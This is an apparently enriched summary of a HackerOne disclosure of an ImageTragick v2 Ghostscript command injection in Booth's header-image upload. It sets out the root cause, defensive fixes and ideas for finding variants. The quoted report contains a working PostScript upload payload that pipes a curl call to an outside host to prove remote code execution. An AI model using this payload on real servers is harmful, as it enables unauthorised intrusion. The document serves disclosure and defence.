# RCE due to ImageTragick v2 - Ghostscript Command Injection

## Metadata
- **Source:** HackerOne
- **Report:** 402362 | https://hackerone.com/reports/402362
- **Submitted:** 2018-08-29
- **Reporter:** chaosbolt
- **Program:** Pixiv (Booth)
- **Bounty:** Not specified
- **Severity:** Critical
- **Vuln:** Remote Code Execution, Command Injection, Unsafe Image Processing, PostScript Interpreter Abuse
- **CVEs:** None
- **Category:** memory-binary

## Summary
Booth's image processing endpoint is vulnerable to ImageTragick v2, a variant of the ImageMagick/Ghostscript RCE vulnerability. An attacker can upload a malicious PostScript file disguised as JPEG to achieve arbitrary command execution on the server. The vulnerability stems from ImageMagick delegating PostScript processing to an improperly configured Ghostscript interpreter without input validation.

## Attack scenario
1. Attacker identifies the PATCH /design endpoint at manage.booth.pm accepts image uploads for shop headers
2. Attacker crafts a malicious file containing PostScript commands that inject shell commands via the %pipe% operator
3. Attacker sends multipart form request with Content-Type: image/jpeg header containing PostScript payload
4. Server's ImageMagick library processes the uploaded file and delegates to Ghostscript interpreter
5. Ghostscript interprets the %pipe% directive and executes the embedded curl command with attacker-controlled URL
6. Arbitrary command execution occurs on the server with the privileges of the web application process

## Root cause
ImageMagick and Ghostscript were not updated to versions containing fixes for CVE-2016-3714 and related vulnerabilities. The application failed to validate file contents before processing and did not restrict Ghostscript's dangerous features like %pipe% operator for arbitrary command execution. PostScript/PDF processing was enabled without proper sandboxing.

## Attacker mindset
Straightforward exploit of a well-known, publicly documented vulnerability category. The attacker demonstrates proof-of-concept by exfiltrating data via DNS/HTTP callback (avtohanter.ru), showing intent to verify code execution before deeper exploitation.

## Defensive takeaways
- Immediately patch ImageMagick and Ghostscript to latest versions addressing ImageTragick variants
- Implement strict file type validation based on file content (magic bytes) rather than extension or Content-Type header
- Disable dangerous Ghostscript features via policy.xml: disable PostScript, PDF, and PS delegates if not required
- Run image processing in isolated containers/sandboxes with minimal privileges and network restrictions
- Implement file upload whitelisting - only allow specific safe image formats (PNG, JPEG without PostScript)
- Consider using safer image processing libraries without Ghostscript dependency
- Add security monitoring for unexpected process spawning from application processes
- Implement comprehensive input validation and sanitization for all file uploads

## Variant hunting
Search for similar ImageMagick delegation vulnerabilities affecting other image processing endpoints. Test GIF, SVG, PDF, EPS uploads. Look for other %pipe%, shell metacharacter injection vectors in image headers. Check for SVG-based XXE/RCE variants and WebP processing vulnerabilities.

## MITRE ATT&CK
- T1190
- T1204
- T1566
- T1059
- T1570

## Notes
ImageTragick refers to CVE-2016-3714 and related ImageMagick vulnerabilities discovered in 2016. The 'v2' designation indicates this is a variant bypassing initial patches. The exploit uses PostScript %pipe% operator which pipes output to arbitrary shell commands. The report is notably minimal in detail and lacks evidence of actual exploitation or impact confirmation from the platform.

## Full report
<details><summary>Expand</summary>

Hello Pixiv team! Your Image processing process suffering from ImageTragick v2. Issue is caused by ghostscript RCE findnings.

How to reproduce:
PATCH /design
Host: manage.booth.pm

send following image:
```
------WebKitFormBoundaryXX05yrKS4g8d9CWh
Content-Disposition: form-data; name="shop[header]"; filename="imagetragick.jpeg"
Content-Type: image/jpeg

%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%curl https://avtohanter.ru/qwetest) currentdevice putdeviceprops
------WebKitFormBoundaryXX05yrKS4g8d9CWh--
```

How to fix:
Update ImageMagick, should help

## Impact

Remote Code Execution

</details>

---
*Analysed by Claude on 2026-05-12*
